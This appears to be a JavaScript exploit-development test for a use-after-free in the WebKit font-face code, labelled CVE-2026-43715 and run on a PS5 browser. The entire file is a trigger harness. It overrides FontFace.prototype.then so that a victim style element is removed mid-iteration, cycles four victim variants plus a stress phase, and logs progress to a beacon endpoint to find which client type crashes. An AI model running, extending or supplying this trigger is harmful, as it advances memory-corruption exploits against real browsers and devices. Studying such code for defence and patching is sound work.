// p445 v2 — CVE-2026-43715 CSSFontFace iterateClients UAF device test
// Beacon prefix: V445-
//
// Run 1 confirmed on device: the .then getter executes synchronously inside
// the client iteration loop (local(Helvetica) rounds only — every other
// local() name and a data: URI TTF reject with NetworkError). No crash:
// removing a rule that merely *uses* the family does not disconnect a client
// that sits after the FontFace in the iteration snapshot.
//
// v2 cycles victim variants aimed at the other client types:
//   face-rule    victim style holds an @font-face rule for the same family
//                (tears down the CSS-created face's clients on removal)
//   use-rule     control: rule using the family (run-1 behaviour)
//   canvas-lookup  use-rule + canvas measureText forces a CSSFontSelector
//                lookup with a cache entry before the load completes
//   unicode-range  @font-face with unicode-range -> CSSSegmentedFontFace
//                path, sink text inside the range
// Each round uses a fresh family name so font-face-set caches and active
// counts start clean. A stress phase at the end keeps faces in the set and
// fires rounds quickly.
//
// Crash signature: beacons stop after a V445-THEN-* for some variant;
// the last variant tag names the client type that died.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V445-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT2');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 120) +
      '-L' + line + '-C' + col);
    return false;
  };

  var SRC = 'local(Helvetica)'; // only source proven to reach Success on PS5
  var getterHits = 0;
  var currentVariant = 'none';

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      getterHits++;
      B('THEN-' + getterHits + '-' + currentVariant);
      var victim = document.getElementById('victim-style');
      if (victim) {
        victim.remove();
        document.body.offsetHeight;   // synchronous layout
        void document.body.getBoundingClientRect();
        B('REMOVED-' + currentVariant);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  var VARIANTS = ['face-rule', 'use-rule', 'canvas-lookup', 'unicode-range'];

  function plant(variant, fam) {
    var s = document.createElement('style');
    s.id = 'victim-style';
    var sink = document.createElement('div');
    sink.className = 'sink';

    if (variant === 'face-rule') {
      // CSS-created face for the same family; removing the rule tears it down.
      s.textContent = '@font-face { font-family: "' + fam + '"; src: ' + SRC + '; }';
      sink.style.fontFamily = '"' + fam + '", serif';
      sink.textContent = 'px';
    } else if (variant === 'use-rule') {
      s.textContent = '.sink { font-family: "' + fam + '", serif; }';
      sink.textContent = 'px';
    } else if (variant === 'canvas-lookup') {
      s.textContent = '.sink { font-family: "' + fam + '", serif; }';
      sink.textContent = 'px';
    } else { // unicode-range
      s.textContent = '@font-face { font-family: "' + fam + '"; src: ' + SRC +
                      '; unicode-range: U+41-5A; }';
      sink.style.fontFamily = '"' + fam + '", serif';
      sink.textContent = 'AB';
    }

    document.head.appendChild(s);
    document.body.appendChild(sink);
    document.body.offsetHeight; // force the family lookup before the load

    if (variant === 'canvas-lookup') {
      try {
        var c = document.createElement('canvas');
        var ctx = c.getContext('2d');
        ctx.font = '16px "' + fam + '", serif';
        B('CANVAS-W' + ctx.measureText('px').width);
      } catch (e) {
        B('CANVAS-ERR');
      }
    }
  }

  function round(i, keep) {
    var variant = VARIANTS[i % VARIANTS.length];
    currentVariant = variant;
    var fam = 'p445f' + i;

    B('R' + i + '-' + variant);
    plant(variant, fam);

    var face = new FontFace(fam, SRC);
    document.fonts.add(face);
    document.body.offsetHeight; // lookup with the JS face in the set

    face.load().then(
      function(f) {
        B('OK-' + i + '-H' + getterHits);
        if (!keep) document.fonts.delete(f);
      },
      function(e) {
        B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 80) +
          '-H' + getterHits);
      }
    );
  }

  // Phase 1: one variant per round, clean sets, 600 ms apart.
  var i = 0;
  (function step() {
    if (i >= 12) {
      B('PHASE2');
      // Phase 2: stress — faces stay in the set, rounds come fast, so the
      // CSSFontFaceSet active-count and iteration snapshots carry state.
      var j = 0;
      (function stress() {
        if (j >= 20) { B('DONE-H' + getterHits); return; }
        round(j, true);
        j++;
        setTimeout(stress, 150);
      })();
      return;
    }
    round(i, false);
    i++;
    setTimeout(step, 600);
  })();
})();
